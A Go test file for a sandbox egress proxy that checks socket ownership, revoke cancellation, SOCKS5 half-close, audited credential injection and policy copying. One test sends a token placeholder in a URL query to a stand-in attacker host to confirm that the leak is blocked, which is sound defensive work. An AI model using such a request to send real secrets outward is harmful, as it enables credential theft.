package egress

import (
	"context"
	"errors"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sync/atomic"
	"testing"
	"time"
)

func TestOwnedStaleSocketRecoveryAndLiveSocketProtection(t *testing.T) {
	dir, err := os.MkdirTemp("", "egress-owner-")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(dir)
	base := filepath.Join(dir, "vsock")
	stale, err := net.ListenUnix(
		"unix",
		&net.UnixAddr{Name: base + "_2049", Net: "unix"},
	)
	if err != nil {
		t.Fatal(err)
	}
	stale.SetUnlinkOnClose(false)
	if err := stale.Close(); err != nil {
		t.Fatal(err)
	}
	var proofCalls atomic.Int32
	m, err := New(
		Options{
			RecoverStaleSocket: func(b Binding, path string, info os.FileInfo) bool {
				proofCalls.Add(1)
				return b.SandboxID == "s" && path == base+"_2049" &&
					info.Mode()&os.ModeSocket != 0
			},
		},
	)
	if err != nil {
		t.Fatal(err)
	}
	defer m.Close()
	if err := m.Bind(
		context.Background(),
		"s",
		"t",
		base,
		Policy{Mode: "relay"},
		nil,
	); err != nil {
		t.Fatal(err)
	}
	if proofCalls.Load() != 1 {
		t.Fatal("stale socket was not authenticated")
	}
	// Even an ownership callback cannot authorize removing a live listener.
	other, err := New(
		Options{
			RecoverStaleSocket: func(Binding, string, os.FileInfo) bool { return true },
		},
	)
	if err != nil {
		t.Fatal(err)
	}
	defer other.Close()
	if err := other.Bind(
		context.Background(),
		"s",
		"t",
		base,
		Policy{Mode: "relay"},
		nil,
	); err == nil {
		t.Fatal("replaced a live socket")
	}
	// Revoke must not unlink a different inode installed at the same pathname.
	if err := os.Remove(base + "_2049"); err != nil {
		t.Fatal(err)
	}
	replacement, err := net.ListenUnix(
		"unix",
		&net.UnixAddr{Name: base + "_2049", Net: "unix"},
	)
	if err != nil {
		t.Fatal(err)
	}
	defer replacement.Close()
	if err := m.Revoke("s"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(base + "_2049"); err != nil {
		t.Fatal("revoke removed replacement socket")
	}
}

func TestRevokeCancelsInFlightNumericDial(t *testing.T) {
	started := make(chan struct{})
	stopped := make(chan struct{})
	m, b := newTestManager(
		t,
		Options{
			DialContext: func(ctx context.Context, _, _ string) (net.Conn, error) {
				close(started)
				<-ctx.Done()
				close(stopped)
				return nil, ctx.Err()
			},
		},
		Policy{Mode: "relay"},
		nil,
	)
	client := proxyClient(t, m, b)
	done := make(chan struct{})
	go func() {
		defer close(done)
		resp, err := client.Get("http://example.com/")
		if err == nil {
			_ = resp.Body.Close()
		}
	}()
	select {
	case <-started:
	case <-time.After(3 * time.Second):
		t.Fatal("numeric dial did not start")
	}
	if err := m.Revoke("sandbox-1"); err != nil {
		t.Fatal(err)
	}
	select {
	case <-stopped:
	case <-time.After(time.Second):
		t.Fatal("revoke did not cancel dial")
	}
	select {
	case <-done:
	case <-time.After(time.Second):
		t.Fatal("request survived revoke")
	}
}

func TestSOCKS5HalfClose(t *testing.T) {
	up, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer up.Close()
	done := make(chan struct{})
	go func() {
		defer close(done)
		conn, err := up.Accept()
		if err != nil {
			return
		}
		defer conn.Close()
		_ = conn.SetDeadline(time.Now().Add(3 * time.Second))
		data, err := io.ReadAll(conn)
		if err == nil {
			_, _ = conn.Write(append([]byte("echo:"), data...))
		}
	}()
	_, b := newTestManager(
		t,
		Options{DialContext: targetDialer(up.Addr().String(), nil)},
		Policy{Mode: "relay"},
		nil,
	)
	conn, status := socksConnect(t, b.SOCKSPath, "example.com", 1)
	defer conn.Close()
	if status != 0 {
		t.Fatal(status)
	}
	_, _ = io.WriteString(conn, "payload")
	if err := conn.(*net.UnixConn).CloseWrite(); err != nil {
		t.Fatal(err)
	}
	data, err := io.ReadAll(conn)
	if err != nil || string(data) != "echo:payload" {
		t.Fatalf("half-close lost reply: %q %v", data, err)
	}
	<-done
}

func TestCredentialsRequireAuditAndEncodedPlaceholdersAreDenied(t *testing.T) {
	m, err := New(Options{})
	if err != nil {
		t.Fatal(err)
	}
	defer m.Close()
	secrets := map[string]Secret{
		"key": {
			Value:       "host-secret",
			Hosts:       []string{"example.com"},
			Header:      "Authorization",
			Placeholder: "Bearer phantom",
		},
	}
	if err := m.Bind(
		context.Background(),
		"s",
		"t",
		"/tmp/unused",
		Policy{Mode: "relay"},
		secrets,
	); err == nil {
		t.Fatal("credentials activated without an audit sink")
	}
	m2, b := newTestManager(t, Options{}, Policy{Mode: "relay"}, secrets)
	resp, _ := get(
		t,
		proxyClient(t, m2, b),
		"https://attacker.example.com/?token=Bearer+phantom",
	)
	if resp.StatusCode != 403 {
		t.Fatal("encoded placeholder was forwarded")
	}
}

func TestPolicyIsCopiedAndBindContextIsInstallationOnly(t *testing.T) {
	up := httptest.NewServer(
		http.HandlerFunc(
			func(w http.ResponseWriter, _ *http.Request) { _, _ = io.WriteString(w, "ok") },
		),
	)
	defer up.Close()
	m, err := New(
		Options{
			Resolver:    publicResolver(),
			DialContext: targetDialer(up.Listener.Addr().String(), nil),
		},
	)
	if err != nil {
		t.Fatal(err)
	}
	defer m.Close()
	dir, err := os.MkdirTemp("", "egress-copy-")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(dir)
	p := Policy{Mode: "relay", AllowedHosts: []string{"example.com"}}
	ctx, cancel := context.WithCancel(context.Background())
	if err := m.Bind(
		ctx,
		"s",
		"t",
		filepath.Join(dir, "vsock"),
		p,
		nil,
	); err != nil {
		t.Fatal(err)
	}
	cancel()
	p.AllowedHosts[0] = "attacker.example.com"
	b, _ := m.Binding("s")
	resp, _ := get(t, proxyClient(t, m, b), "http://example.com/")
	if resp.StatusCode != 200 {
		t.Fatal("binding changed after caller mutation or context cancellation")
	}
	if err := m.Bind(
		context.Background(),
		"s",
		"t",
		filepath.Join(dir, "vsock"),
		p,
		nil,
	); err == nil {
		t.Fatal("duplicate binding was silently accepted")
	}
	if err := m.Close(); err != nil {
		t.Fatal(err)
	}
	if err := m.Bind(
		context.Background(),
		"s2",
		"t",
		filepath.Join(dir, "vsock"),
		p,
		nil,
	); !errors.Is(
		err,
		ErrClosed,
	) {
		t.Fatalf("closed manager accepted binding: %v", err)
	}
}
